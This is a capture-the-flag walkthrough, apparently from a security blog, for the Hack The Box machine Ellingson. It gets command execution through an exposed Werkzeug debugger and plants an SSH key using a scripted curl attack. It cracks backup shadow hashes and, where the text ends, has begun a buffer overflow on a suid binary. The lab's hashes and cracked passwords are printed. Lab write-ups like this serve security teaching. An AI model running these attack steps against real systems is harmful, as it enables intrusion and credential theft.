---
title: HTB: Ellingson
url: https://0xdf.gitlab.io/2019/10/19/htb-ellingson.html
date: 2019-10-19T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-ellingson, hackthebox, ctf, nmap, werkzeug, python, flask, debugger, ssh, bash, hashcat, credentials, bof, rop, pwntools, aslr, gdb, peda, ret2libc, checksec, pattern-create, onegadget, cron, htb-october, htb-redcross, flask-debug
---

![Ellingson](https://0xdfimages.gitlab.io/img/ellingson-cover.png)

Ellingson was a really solid hard box. I’ll start with ssh and http open, and find that they’ve left the Python debugger running on the webpage, giving me the opporutunity to execute commands. I’ll use that access to write my ssh key to the authorized\_keys file, and get a shell as hal. I’ll find that hal has access to the shadow.bak file, and from there, I can break margo’s password. Once sshed in as margo, I will find a suid binary that I can overflow to get a root shell. In Beyond Root, I’ll explore two cronjobs. The first breaks the privesc from hal to margo, resetting the permissions on the shadow.bak file to a safe configuration. The second looks like a hint that was disabled, or maybe forgotten.

## Box Info

| Name | [Ellingson](https://hackthebox.com/machines/ellingson)  [Ellingson](https://hackthebox.com/machines/ellingson) [Play on HackTheBox](https://hackthebox.com/machines/ellingson) |
| --- | --- |
| Release Date | [18 May 2019](https://twitter.com/hackthebox_eu/status/1129017015132393472) |
| Retire Date | 19 Oct 2019 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Ellingson |
| Radar Graph | Radar chart for Ellingson |
| First Blood User | 01:16:38[frosters frosters](https://app.hackthebox.com/users/32730) |
| First Blood Root | 03:24:46[sampriti sampriti](https://app.hackthebox.com/users/836) |
| Creator | [Ic3M4n Ic3M4n](https://app.hackthebox.com/users/30224) |

## Recon

### nmap

`nmap` reveals ssh (22) and http (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.139
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-31 01:23 EDT
Nmap scan report for 10.10.10.139
Host is up (0.096s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.63 seconds
root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.139                                                                                                            
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-31 01:23 EDT
Nmap scan report for 10.10.10.139
Host is up (0.089s latency).
All 65535 scanned ports on 10.10.10.139 are open|filtered

Nmap done: 1 IP address (1 host up) scanned in 14.23 seconds
root@kali# nmap -p 22,80 -sC -sV -oA scans/nmap-scripts 10.10.10.139
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-31 01:24 EDT
Nmap scan report for 10.10.10.139
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)
|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)
|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-title: Ellingson Mineral Corp
|_Requested resource was http://10.10.10.139/index
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds

```

Based on the [OpenSSH version](https://packages.ubuntu.com/search?keywords=openssh-server), the box is likely Ubuntu Bionic (18.04).

### Website - TCP 80

#### Site

Website for Ellingson Mineral Corp:

![1559280466839](https://0xdfimages.gitlab.io/img/1559280466839.png)

The three bits in the middle have more buttons that present three bits of info about a recent breach:
*Virus Planted in Ellingson Mainframe*

> ﻿A recent unknown intruder penetrated using a super user account giving him access to our entire system. Yesterday the ballest program for a supertanker training model
> mistakenly thought the vessel was empty and flooded it’s tanks. This caused the vessel to capsize, a virus planted within the Ellingson system claimed responsibility and threatened to capsize more vessels unless five million dollars are transferred to their accounts.
*Additional Protections Added*

> ﻿Due to the recent security issues we have implemented protections to block brute-force attacks against network services. As a result if you attempt to log into a service more then 5 times in 1 minute you will have your access blocked for 5 minutes. Additional malicious activity may also result in your connection being blocked, please keep this in mind and do not request resets if you lock yourself out … take the 5 minutes and ponder where you went wrong :)
*Suspicious Network Activity*

> ﻿We have recently detected suspicious activity on the network. Please make sure you change your password regularly and read my carefully prepared memo on the most commonly used passwords. Now as I so meticulously pointed out the most common passwords are.
> Love, Secret, Sex and God
> -The Plague

#### Error page

I noted that the various pages for posts were at `http://10.10.10.139/articles/1`, `http://10.10.10.139/articles/2`, and `http://10.10.10.139/articles/3`. I decided to check `http://10.10.10.139/articles/4`:

![1559481488434](https://0xdfimages.gitlab.io/img/1559481488434.png)

When I hover over any one line, a terminal icon appears (I’ve put a red box around it):

![1559481523999](https://0xdfimages.gitlab.io/img/1559481523999.png)

If I click it, I get a python3 shell I can type into:

![1559481833665](https://0xdfimages.gitlab.io/img/1559481833665.png)

This is an instance of the [Werkzeug Debugger](https://werkzeug.palletsprojects.com/en/0.15.x/debug/). Werkzeug is a Python library that provides various utilities for [Web Server Gateway Interface (WSGI)](https://wsgi.readthedocs.io/en/latest/what.html) applications. WSGI is a specification that defines how a webserver (like NGINX) communicates with a Python web application (for example, something running on Flask). One of the utilities Werkzeug provides is a debugger, that allows a developer to start debugging their Python where an error occurs. However, as the Werkzeug debugger page warns, it is not secure:

![1568700168682](https://0xdfimages.gitlab.io/img/1568700168682.png)

## Shell as hal

### Reverse Shell Fail

In enumerating I started to show how I had at least some RCE on Ellingson with Python commands in the debugger. When I try to run various reverse shell commands, nothing seems to connect back. I suspect there is a firewall blocking outbound connections.

### File System Enum

I’ll shift strategies and start taking a look around the box:

```

>>> os.getcwd()
'/'
>>> os.listdir()
['lost+found', 'opt', 'swap.img', 'usr', 'srv', 'initrd.img.old', 'home', 'sys', 'dev', 'var', 'bin', 'lib', 'vmlinuz', 'proc', 'initrd.img', 'lib64', 'sbin', 'root', 'etc', 'tmp', 'run', 'vmlinuz.old', 'boot', 'mnt', 'snap', 'media']

```

There’s 4 users:

```

>>> os.listdir('/home')
['margo', 'duke', 'hal', 'theplague']

```

hal is the only one can I access:

![1559482659196](https://0xdfimages.gitlab.io/img/1559482659196.png)

### ssh as hal

Inside hal’s homedir, there’s a `.ssh` dir:

```

>>> os.listdir('/home/hal/.ssh')
['id_rsa', 'authorized_keys', 'id_rsa.pub']

```

I can pull the `id_rsa`, but it’s encrypted:

```

>>> with open('/home/hal/.ssh/id_rsa','r') as f: f.read()
'-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,4F7C6A9FD8FB74EDF6E605487045F91D\n\nqVxdFeBjyqXIUkZ6A+8u77HfZgUUwmPOuhN9xFYy+f36kKwr1Wol3iWRHB7W7Ien\n5vjyyNT3+mTO272NcAwreWRH0EZWDmvltWP5e9gESTpA4ja+vNP32UNwJ9lK1PLL\nmSm7XFl4xOMkhheRzJlLRF7b41C8PKsMVP2DpaHLMxHwTCY1fX5j/QgWpwPN5W0R\nDTQvsHyFj+gfsYjCTdrHUX0Dhg+LdVr7SH9NDt0twg/RxtXkAvwbyw3eRXAR0YCB\nmrldQ4ymh91G4CapoIOyGUVZUPE/Sz1ZExVCTlfGT9LUgE8L7aaImdOxFkrKDiVb\nddhdWnXwnCrkxIaktwCSIFzl8iT71OxsQOcoq+VV8VbOsL2ICdgHNOIxQ2HonRQS\nEj19P02Ea5rOHVVx/SYxT+ce6Zx301GkYmPu80LVVFK8x7gRajMYgFu/bgC67F91\n/QQ6IYkpoSr+eY8l0aJa5IpUo20sGV6xktiyx4V5+kMudiNTE/SAAea/vCCBBqZl\n5YFdp/TW5sqvkvB5w4/a/UUj1POa0tT/Ckox9JWq2idq+tYw+MATejY+Xv1HUOun\nYuV0Lm5AjdSBAcpIfU6ztJQ1zoVVYPqWXwRia38pSFDTz1pAHt9W6JBCRT3PKLo9\nrb8xOhvx6VNj4ZgvaEdxw25RCAGyoEN6/S7z/tgVYZvWoXRqUvOkYq2iyECQ+6ib\nqn/YjpRCX0Q9/3QRH0XSfTo7GvzbS4nTC2KubxmG9CJv/AAfdf1DcpvSfjtkUn5a\nbN1NOMWbJkrFCLeS6P4fPUJt8VwEJXP+IQaqz9bJYyRI1uIrG2PhzpRZ+24iHv63\n2lY+lZpeZBdagYJcp3qnh/f6kVtD+AyhyDurQ+EhsgBdqm4XM+d7AvilTDzqiU3v\nb6ZIzTRsVTWUKsTfvkiFop64d8uIov16b6FimiG/YNFQfd7SUL8hvjJVeArWRGjO\nvPn+RB4BYS0s3VZI+08Jo/BL8EXFeuMZdpbDFnGDhaINSL1/cZasQS6hRYUJsKZN\nT7ptM3NdKNyrVGwfKyttp3OHZFjPRjZezpBR60q+HI37pt/iDkuhbeK2Pr9jNR3f\njfqv8lGlOMIoPA6ERxPveUrLldL6NfLT0gPasDrWo0RRDIzanqz0wYK/SfuIiumT\n8tonBa4kQlxAyenW1p+nx5bZ1QXPQaUbXbAe3AbOU2YG20LJ0v8mxVZE0zP9QNZM\nDSHtv3uIl3nONJIJryp8Y6UjW1q3+UaAnTS6J/IXk+JVsSIRs5hbNDtNLlhFowDq\n2OWEh2CRE7TNptk6Bb8pZbfyA/lCXJhJjo8YZLc3xZ2h1WF1vaXCHYo/FNqeoS0k\nyicWCEz2fSKfNMnMpcVreQglfA9u49+Cvqzt1JnIlX1gDUg8EXV5rLAEgiSRfVin\nB1pTjH/EROnppfQkteSbRq9B9rrvcEQ8Q5JPjr7kp3kk07spyiV6YqNmxVrvQtck\nrQ+X68SNYRpsvCegy59Dbe5/d6jMdFxBzUZQKAHCyroTiUS8PtsAIuRechR0Cbza\nOM2FRsIM8adUzfx7Q91Or+k2pIKNKqr+5sIpb4M0GHggd7gD10E+IBUjM9HsQR+o\n-----END RSA PRIVATE KEY-----\n'

```

I can more easily just create an ssh keypair and write the public key into the file:

```

>>> with open('/home/hal/.ssh/authorized_keys','a') as f: f.write('\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0SwpwZ7rgMtCZYzkDtFJvQZO20N+8DmYxOix+PgL6VQW/9wZC3xnKK1zeAelMYtv/O38GXE2ghUH7z6ayVmTMkjGqt18mhsEpCt0BbonGRC0IHoBsV5QBVNin+x1soVdECT1Tr45bNnTnkZXIgSyDumc+2Ix6A1wiiC5RbI3SrxJ7nL0lRlhjdoAH6KCb4dwhX+Jos0VudHRreE01+0YE0Qb7Sd0eA5Cq7UtjgiW6VyXcmWH7aQdVZlUanrs5wdwWYeVCxY/XfFCCDmHZw+8W5INudM2t7on7bl/rYnhAExOr14/1s7LfYAfV8B6VNPPX+IOzOcT4aYQC3rRDiG5P root@kali')

```

Now I can ssh in using the matching private key:

```

root@kali# ssh -i ~/id_rsa_generated hal@10.10.10.139
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-46-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  2 13:35:06 UTC 2019

  System load:  0.92               Processes:            101
  Usage of /:   23.5% of 19.56GB   Users logged in:      0
  Memory usage: 13%                IP address for ens33: 10.10.10.139
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

163 packages can be updated.
80 updates are security updates.

Last login: Sun Mar 10 21:36:56 2019 from 192.168.1.211
hal@ellingson:~$ 

```

### Script It

I checked out the requests that the debugger sends in Burp and determined how I could send the same commands via a script. The following script will get a shell as hal by adding my public key to the `authorized_keys` file, connecting with ssh, and then removing that entry from the `authorized_keys` file.

```

#!/bin/bash

KEY=/root/id_rsa_generated
PUB_KEY=$(cat $KEY.pub)
TARGET_PATH=/home/hal/.ssh/authorized_keys

SECRET=$(curl -s 'http://10.10.10.139/articles/4'| grep SECRET | cut -d'"' -f2)
FRAME=$(curl -s 'http://10.10.10.139/articles/4'| grep 'id="frame' | head -1 | cut -d- -f2 | cut -d'"' -f1)
echo "[+] Got frame and secret from debug page"

function run_cmd {
    curl -s -G -X GET "http://10.10.10.139/articles/4?__debugger__=yes&frm=$FRAME&s=$SECRET" --data-urlencode "cmd=$1" -x 127.0.0.1:8080 | grep -v ">>>" > /dev/null
}

echo "[*] Copying ${TARGET_PATH} to ${TARGET_PATH}.bak"
run_cmd "import shutil"
run_cmd "shutil.copyfile(\"${TARGET_PATH}\", \"${TARGET_PATH}.bak\")"
echo "[*] Writing $key.pub to $TARGET_PATH"
run_cmd "f=open(\"${TARGET_PATH}\", 'a')"
run_cmd "f.write(\"\n${PUB_KEY}\")"
run_cmd "f.close()"

echo "[*] Connecting to ellingson as hal"
echo "[*] Should reset $TARGET_PATH to original"
ssh -t -i /root/id_rsa_generated hal@10.10.10.139 "mv ${TARGET_PATH}.bak ${TARGET_PATH}; bash"

```

It gets a shell:

```

root@kali# ./hal_shell.sh
[+] Got frame and secret from debug page
[*] Copying /home/hal/.ssh/authorized_keys to /home/hal/.ssh/authorized_keys.bak
[*] Writing .pub to /home/hal/.ssh/authorized_keys
[*] Connecting to ellingson as hal
[*] Should reset /home/hal/.ssh/authorized_keys to original
hal@ellingson:~$

```

## Priv: hal –> margo

### Enumeration

Right away when I run `id` I notice that hal is in the `adm` group:

```

hal@ellingson:~$ id
uid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)

```

According to the [Debian documentation](https://wiki.debian.org/SystemGroups):

> Group adm is used for system monitoring tasks. Members of this group can
> read many log files in /var/log, and can use xconsole. Historically,
> /var/log was /usr/adm (and later /var/adm), thus the name of the group.

This is interesting and unusual. After a few minutes of looking around `/var/log` and not seeing much that was useful, I decided to see what all the files owned by this group were:

```

hal@ellingson:/$ find / -group adm 2>/dev/null
/var/backups/shadow.bak
/var/spool/rsyslog
/var/log/auth.log
/var/log/mail.err
/var/log/fail2ban.log
/var/log/kern.log
/var/log/syslog
/var/log/nginx
/var/log/nginx/error.log
/var/log/nginx/access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/apt/term.log
/var/log/apport.log
/var/log/mail.log
/snap/core/6405/var/log/dmesg
/snap/core/6405/var/log/fsck/checkfs
/snap/core/6405/var/log/fsck/checkroot
/snap/core/6405/var/spool/rsyslog
/snap/core/4917/var/log/dmesg
/snap/core/4917/var/log/fsck/checkfs
/snap/core/4917/var/log/fsck/checkroot
/snap/core/4917/var/spool/rsyslog
/snap/core/6818/var/log/dmesg
/snap/core/6818/var/log/fsck/checkfs
/snap/core/6818/var/log/fsck/checkroot
/snap/core/6818/var/spool/rsyslog

```

The top one jumped right off the page:

```

hal@ellingson:/var/backups$ cat shadow.bak 
root:*:17737:0:99999:7:::
daemon:*:17737:0:99999:7:::
bin:*:17737:0:99999:7:::
sys:*:17737:0:99999:7:::
sync:*:17737:0:99999:7:::
games:*:17737:0:99999:7:::
man:*:17737:0:99999:7:::
lp:*:17737:0:99999:7:::
mail:*:17737:0:99999:7:::
news:*:17737:0:99999:7:::
uucp:*:17737:0:99999:7:::
proxy:*:17737:0:99999:7:::
www-data:*:17737:0:99999:7:::
backup:*:17737:0:99999:7:::
list:*:17737:0:99999:7:::
irc:*:17737:0:99999:7:::
gnats:*:17737:0:99999:7:::
nobody:*:17737:0:99999:7:::
systemd-network:*:17737:0:99999:7:::
systemd-resolve:*:17737:0:99999:7:::
syslog:*:17737:0:99999:7:::
messagebus:*:17737:0:99999:7:::
_apt:*:17737:0:99999:7:::
lxd:*:17737:0:99999:7:::
uuidd:*:17737:0:99999:7:::
dnsmasq:*:17737:0:99999:7:::
landscape:*:17737:0:99999:7:::
pollinate:*:17737:0:99999:7:::
sshd:*:17737:0:99999:7:::
theplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::
hal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::
margo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::
duke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::

```
*Note: There’s a bug in this box where the permissions on this file change and you can no longer access it as hal. Resetting the box will set it back to the vulnerable state. I’ll look at what’s happening in [Beyond Root](#broken-priv).*

### Cracking Hashes

I started with `hashcat` and `rockyou`, but wasn’t making much progress. These `$6$` hashes are sha512, and very slow to break:

```

root@kali# hashcat --example-hashes | grep -F '$6$' -B 1
MODE: 1800
TYPE: sha512crypt $6$, SHA512 (Unix)
HASH: $6$72820166$U4DVzpcYxgw7MVVDGGvB2/H5lRistD5.Ah4upwENR5UtffLR4X4SxSzfREv8z6wVl0jRFX40/KnYVvK4829kD1

```

The password for theplague did break as “password123”, but it didn’t prove to provide any value.

### Tuning Wordlist

I had the hint from the front of the website talking about common passwords with “Love, Secret, Sex and God”. So I created a custom list with case insensitive (`-i`) `grep` and `rockyou`, which reduced the overall list to about 2% of the original `rockyou.txt`:

```

root@kali# grep -i -e love -e secret -e sex -e god /usr/share/wordlists/rockyou.txt > grepped_rockyou 

root@kali# wc -l /usr/share/wordlists/rockyou.txt grepped_rockyou 
 14344392 /usr/share/wordlists/rockyou.txt
   277308 grepped_rockyou
 14621700 total

```

### Cracking Again

I ran `hashcat` with this new wordlist, and got a match:

```

root@kali# hashcat -m 1800 shadow.bak grepped_rockyou --force
...[snip]...
$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:iamgod$08
...[snip]...

```

That’s margo’s password, “iamgod$08”.

### su / ssh

With that password, I can both `su` from hal or ssh in as margo:

```

hal@ellingson:/var/backups$ su - margo
Password: 
margo@ellingson:~$ id
uid=1002(margo) gid=1002(margo) groups=1002(margo)

```

And now I can grab user.txt:

```

margo@ellingson:~$ cat user.txt 
d0ff9e3f...

```

## Priv: margo –> root

### Enumeration

Looking around, I found a suid binary that looked interesting:

```

margo@ellingson:/dev/shm$ find / -perm -4000 -type f -ls 2>/dev/null | head
...[snip]...
  1049073     20 -rwsr-xr-x   1 root     root        18056 Mar  9 21:04 /usr/bin/garbage
...[snip]...

```

It definitely seems non-standard, and seems vulnerable to an overflow:

```

margo@ellingson:/dev/shm$ garbage
Enter access password: password

access denied.
margo@ellingson:/dev/shm$ garbage
Enter access password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

access denied.
Segmentation fault (core dumped)

```

I’ll pull this binary back to take a look:

```

root@kali# scp margo@10.10.10.139:/usr/bin/garbage .
margo@10.10.10.139's password: 
garbage                                                  100%   18KB  91.1KB/s   00:00   

```

### Overflow Protections

I’ll also see what kind of protections I’m dealing with. First, is ASLR enabled on the box:

```

margo@ellingson:/dev/shm$ cat /proc/sys/kernel/randomize_va_space 
2

```

Yes, 2 is full randomization.

What other protections are in place?

```

root@kali# checksec ./garbage
[*] '/media/sf_CTFs/hackthebox/ellingson-10.10.10.139/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

So I don’t have to deal with stack canaries or PIE (which means the non-library code will be statically addressed). But I do have NX (so no stack execution), and it’s a 64-bit binary with ASLR. While in a 32-bit case like [October](/2019/03/26/htb-october.html#privesc-to-root) I could just brute forced my way past that, the address space in x64 is too big. So my options are to look for a PLT entry that will give me execution (like I did in [RedCross](/2019/04/13/htb-redcross.html#path-3-bof-in-iptctl)), or to find a way to use ROP to leak a library address, which I can use to calculate the address of libc, and then ROP to execution.

I’ll open the binary in `gdb`. I also have `source ~/peda/peda.py` in my `~/.gdbinit` file, so [Peda](https://github.com/longld/peda) will load on start. I can check for interesting functions in the PLT (because PIE is off, these addresses will be static):

```

gdb-peda$ plt
Breakpoint 1 at 0x400760 (execvp@plt)
Breakpoint 2 at 0x400770 (exit@plt)
Breakpoint 3 at 0x400750 (fflush@plt)
Breakpoint 4 at 0x400730 (fgets@plt)
Breakpoint 5 at 0x400790 (fork@plt)
Breakpoint 6 at 0x400740 (inet_pton@plt)
Breakpoint 7 at 0x400720 (printf@plt)
Breakpoint 8 at 0x400700 (puts@plt)
Breakpoint 9 at 0x400780 (setuid@plt)
Breakpoint 10 at 0x4006f0 (strcpy@plt)
Breakpoint 11 at 0x400710 (strlen@plt)
Breakpoint 12 at 0x4006e0 (strncpy@plt)
Breakpoint 13 at 0x4007a0 (strstr@plt)

```

Nothing there is going to be useful as far as starting execution. I’ll need to use one of those to leak the address of a function in libc, and use that to calculate the address of a more useful function.

### RIP

Now I need to check that I can control RIP, and get the offset while I’m at it. First, I’ll create a pattern:

```

gdb-peda$ pattern_create 400
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'

```

Now, I’ll run the program (`r`), and enter that pattern when it asks me for the password:

```

gdb-peda$ r
Starting program: /media/sf_CTFs/hackthebox/ellingson-10.10.10.139/garbage
Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$
A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y

```

The program crashes:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ec5804 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7f988c0 --> 0x0
RSI: 0x4059c0 ("access denied.\nssword: ")
RDI: 0x0
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fffffffdf68 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)         
RIP: 0x401618 (<auth+261>:      ret)
R8 : 0x7ffff7f9d500 (0x00007ffff7f9d500)
R9 : 0x7ffff7f97848 --> 0x7ffff7f97760 --> 0xfbad2a84
R10: 0xfffffffffffff638
R11: 0x246
R12: 0x401170 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe060 ("vA%YA%wA%ZA%xA%y")
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40160d <auth+250>: call   0x401050 <puts@plt>
   0x401612 <auth+255>: mov    eax,0x0
   0x401617 <auth+260>: leave  
=> 0x401618 <auth+261>: ret    
   0x401619 <main>:     push   rbp
   0x40161a <main+1>:   mov    rbp,rsp
   0x40161d <main+4>:   sub    rsp,0x10
   0x401621 <main+8>:   mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdf68 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)        
0008| 0x7fffffffdf70 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)        
0016| 0x7fffffffdf78 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%S"...)        
0024| 0x7fffffffdf80 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%"...)        
0032| 0x7fffffffdf88 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA"...)        
0040| 0x7fffffffdf90 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%W"...)        
0048| 0x7fffffffdf98 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%"...)        
0056| 0x7fffffffdfa0 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA"...)        
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()

```

In x64, I’m not going to see the segfault with the pattern in RIP like I would in x86. Instead, it throws an exception on trying to move an invalid address into RIP. Since I’m at a `ret`, the address moving into RIP is on top of the stack. So the value that would go into RIP is `AAQAAmAA`. That is part of the string I control, which means getting control over RIP is possible.

Furthermore, I can use `pattern_offset` to see how far into the input buffer those bytes are:

```

gdb-peda$ pattern_offset AAQAAmAA
AAQAAmAA found at offset: 136

```

I can do a sanity check:

```

$ python3 -c 'print("A"*136 + "B"*8)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

```

When I enter that string at the prompt, it crashes here:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
